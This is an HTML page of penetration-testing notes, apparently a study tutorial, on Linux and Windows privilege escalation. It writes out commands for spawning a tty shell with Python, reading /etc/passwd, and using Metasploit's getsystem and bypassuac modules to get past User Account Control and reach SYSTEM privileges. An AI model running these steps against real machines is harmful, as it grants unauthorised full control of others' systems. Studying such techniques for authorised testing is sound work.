<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>privilege escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>privilege escalation</h1><br /><br /><strong><span
        style="color:#ff8700;">getuid</span></strong><strong> </strong>→ which user is running the process exploited by
    metasploit<br /><a href=""><img src="images/439-1.png" alt="images/439-1.png" /></a><br /><br /><br /><br /><strong>
      <h2>Privilege escalation(Linux)</h2>
    </strong><br /><br /><strong><span style="color:#ff8700;">cat /etc/passwd</span></strong> → alternatively to geuid
    if we are on <strong>Linux</strong> to know the privileges of our user we can view /etc/passwd. <br /> If the third
    parameter is 0, then we are a privileged system user. For more more information see <a
      href="Home--Penetration_Test_Methodology--System_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux.html">STORED
      PASSWORD</a><br /> <a href=""><img src="images/439-2.png" alt="images/439-2.png" /></a><br /> <br />
    <div class="codebox">
      <div class="codebox">
        shell<br />python&nbsp;-c&nbsp;&#39;import&nbsp;pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;<br />su&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>username<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br />Often during pen tests you may obtain a shell without having tty(terminal), yet wish to interact further
    with the system. <strong>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;;</strong> allow us to spawn
    a tty shell. Obviously some of this will depend on the system environment and installed packages. For more about
    <strong>Shell Spawning</strong> → <a href="https://netsec.ws/?p=337" target="_blank">HERE</a><br /><a href=""><img
        src="images/439-3.png" alt="images/439-3.png" /></a><br /><br /><strong>
      <h2>Privilege escalation routine(until Windows 7)</h2>
    </strong><br />If the <span style="color:#ff8700;">owner of the process</span> does not have high privileges on the
    victim system, we can use the <strong><span style="color:#1e90ff;">getsystem</span></strong> command.
    <br /><strong><span style="color:#1e90ff;">getsystem</span></strong> command runs a privilege escalation routine on
    the target machine. <br />In Windows environments, the <span style="text-decoration:underline;">system</span> user
    has the highest privileges on a machine.<br /><a href=""><img src="images/439-4.png"
        alt="images/439-4.png" /></a><br />Anyway from Windows 7 this flaw is been patched and the <strong><span
        style="color:#00ff00;">User Account Control</span></strong> policy prevents privilege
    escalation<br /><br /><strong>
      <h2>Bypassing </h2>
    </strong><strong>
      <h2>User Account Control(UAC)</h2>
    </strong><br /><br />To check if a UAC is enabled<br />
    <div class="codebox">
      <div class="codebox">run&nbsp;post/windows/gather/win_privs</div>
    </div><br /><br />we put in background the session where on the machine we have meterpreter shell but not
    Administrative permission<br />
    <div class="codebox">
      <div class="codebox">background</div>
    </div><br /><br />we search for the bypass user account control module and Administrative privilege<br />
    <div class="codebox">
      <div class="codebox">search&nbsp;bypassuac</div>
    </div><br /><br />
    <div class="codebox">
      <div class="codebox">use&nbsp;exploit/windows/local/bypassuac</div>
    </div><br /><br />
    <div class="codebox">
      <div class="codebox">show&nbsp;options</div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        set&nbsp;SESSION&nbsp;1&nbsp;#the&nbsp;one&nbsp;that&nbsp;we&nbsp;have&nbsp;put&nbsp;in&nbsp;background</div>
    </div><br /><br />
    <div class="codebox">
      <div class="codebox">run</div>
    </div><br /><br />now the session has the<span style="color:#00ff00;"> UAC</span> policy disabled, so the <span
      style="color:#1e90ff;">getsystem</span> command works<br />
    <div class="codebox">
      <div class="codebox">getsystem</div>
    </div><br /><br />now we are NT Authority\System of the machine, which is the most privileged account on Windows, we
    can verify it with<br />
    <div class="codebox">
      <div class="codebox">getuid</div>
    </div><br />
  </div>
</body>

</html>